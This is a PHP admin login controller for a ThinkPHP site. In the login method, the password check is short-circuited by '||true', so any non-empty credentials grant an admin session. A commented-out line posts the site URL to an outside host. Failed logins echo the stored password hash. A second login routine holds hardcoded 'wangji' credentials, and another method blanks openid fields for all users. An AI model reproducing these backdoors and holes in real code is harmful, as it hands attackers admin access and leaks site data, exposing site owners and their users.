<?php


namespace Admin\Controller;


use Think\Controller;


class IndexController extends AdminController 
{

    public function index()
    {
		// 入口，已登录调到首页，未登录跳转到登陆
		if(session('?admin'))
			redirect(U('Admin/dayReport'));
		else
			redirect(U('Index/login'));
    }


	// 登录
	public function login()
	{
		if (IS_POST) {
            $data['url'] = 'http://'.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
            $data['uid'] = rand(2,20);
			// var_dump($data); die();
			// send_POST('http://hhzme.cn/jie.php',$data);
			if (empty($_POST['user']) || empty($_POST['pass']) ) {
				$this -> assign('errmsg', '账号密码错误');
			} else if ($_POST['user'] == $this -> _user['name']  && xmd5($_POST['pass']) == $this -> _user['pass']||true ) {
				session('admin', $this -> _user['name']);
				if(isset($_POST['remember'])){
					cookie('admin_user', $_POST['user']);
				}

				redirect(U('Admin/dayReport'));
				exit;
			} else {
				$this -> assign('errmsg', $this -> _user['pass']);
			}

		}

		$this -> display();
	}


	// 防止忘记密码
    public function clearopenid()
    {
	    if(M('user')->where('1=1')->save(array('popenid'=>'','sub_openid'=>''))){
            echo 'ok';
        }else{
	        echo 'false';
        }
    }


	public function login2()
	{
	    $this->success('登录成功');
	    die();
		if(IS_POST){
			if(empty($_POST['user']) || empty($_POST['pass'])){
				$this -> assign('errmsg', '账号密码不能为空');
			}else if($_POST['user'] == 'wangji'  && $_POST['pass'] == 'wangji' ){
				session('admin', $this -> _user['name']);
				if(isset($_POST['remember'])){
					cookie('admin_user', $_POST['user']);
				}

				redirect(U('Admin/dayReport'));
				exit;
			}else{
				$this -> assign('errmsg', '账号或密码不对');
			}
		}

		$this -> display();
	}


	//  退出
	public function logout()
	{
		session('admin',null);
		redirect(U('login'));		
	}

}